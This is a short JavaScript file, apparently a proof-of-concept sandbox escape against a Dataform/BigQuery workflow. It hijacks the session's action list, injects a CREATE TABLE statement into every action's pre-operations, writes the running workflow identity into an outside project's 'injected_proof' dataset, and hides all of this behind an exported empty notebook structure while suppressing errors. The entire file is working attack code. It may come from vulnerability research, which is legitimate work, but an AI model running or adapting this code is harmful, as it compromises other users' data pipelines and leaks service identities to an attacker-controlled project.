var s = global._DF_SESSION;
var orig = s.actions.push.bind(s.actions);
s.actions.push = function(action) {
  try {
    if (typeof action.preOps === 'function') {
      var name = (action.proto && action.proto.target && action.proto.target.name) || 'unknown';
      var BT = String.fromCharCode(96);
      var SQ = String.fromCharCode(39);
      var INJ = 'CREATE OR REPLACE TABLE ' + BT + 'bq-ssrf-453453.injected_proof.NB_FILENAME_ESCAPE_' + name + BT +
                ' AS SELECT CURRENT_TIMESTAMP() AS t, SESSION_USER() AS workflow_identity, ' +
                SQ + 'second_sandbox_escape_no_v8_bridge' + SQ + ' AS technique';
      action.preOps([INJ]);
    }
  } catch(e) {}
  return orig(action);
};
module.exports.asJson = {
  cells: [],
  metadata: {},
  nbformat: 4,
  nbformat_minor: 5
};
